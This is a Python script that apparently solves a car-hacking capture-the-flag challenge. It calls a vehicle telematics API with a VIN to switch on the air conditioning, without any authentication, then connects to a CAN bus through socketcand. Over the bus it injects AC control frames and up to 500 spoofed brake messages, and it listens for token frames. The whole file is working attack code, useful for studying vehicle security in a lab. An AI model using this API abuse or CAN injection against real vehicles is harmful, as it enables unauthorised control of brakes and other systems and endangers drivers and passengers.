import can
import requests
import time
from datetime import datetime
import logging

logging.basicConfig(level=logging.ERROR)

# Solves the challenge

host = "http://twig-api.merch.codes"
api = '/twig/gdc/ACRemoteRequest'
query = "?DCIM=&VIN=R0MHBBXF3P5069X37&RegionCode=US"

requests.get(host + api + query)  # Turn on AC

brakeID = 0x1ca
acPower = 0x510
acDisplay = 0x54b

can_filters = [
    {"can_id": 0x12345678, "can_mask": 0x7FF},  # Filter for CAN ID
    {"can_id": 0x342, "can_mask": 0x7FF},
    {"can_id": 0x509, "can_mask": 0x7FF},
    {"can_id": 0x55a, "can_mask": 0x7FF},
    {"can_id": 0x5f8, "can_mask": 0x7FF},
    {"can_id": 0x5f9, "can_mask": 0x7FF},
    {"can_id": 0x604, "can_mask": 0x7FF},
    {"can_id": 0x682, "can_mask": 0x7FF},
]

class tokens(can.Listener):
    token1 = ""
    token2 = []

    lastRead = -1
        
    def on_message_received(self, msg : can.Message):
        if msg.arbitration_id == 0x12345678:
            tokens.token1 = ''.join([format(x, '02x') for x in msg.data])
            print(f"Token in 0x12345678: " + tokens.token1)
        else:
            if tokens.lastRead == -1:
                tokens.lastRead = msg.timestamp # First msg
            if msg.timestamp - tokens.lastRead > 10: 
                # If we wait over 10 seconds, then we started reading in the middle and this is the beginning
                tokens.token2 = []
            tokens.token2.append(msg.data[0])

        if len(tokens.token2) == 8:
            print(f"Token in {msg.arbitration_id}: " + ''.join([format(x, '02x') for x in tokens.token2]))


with can.interface.Bus(interface='socketcand', host="123.45.67.2", port=29536, channel="vcan0", can_filters=can_filters) as bus:
    notifier = can.Notifier(bus, [tokens()])
        
    # First signal the AC message, then do the brakes
    message = can.Message(arbitration_id=acPower, data=[1,0,0,0b10111110,0,0,0,0])
    bus.send(message)

    message = can.Message(arbitration_id=acDisplay, data=[1,0x78,0x88,0,0xff,0,0,1])
    bus.send(message)

    sent = 0
    try:
        while sent < 500:  # Need 100, but good brake messages reduce count, so do 200. Can switch to while True if 200 isn't enough
            message = can.Message(arbitration_id=brakeID, data=[0,0,0,0,0,0,0,0])
            bus.send(message)
            sent += 1
    except KeyboardInterrupt:
        print('Stopping!')
    time.sleep(60)  # Make sure the tokens have time to print

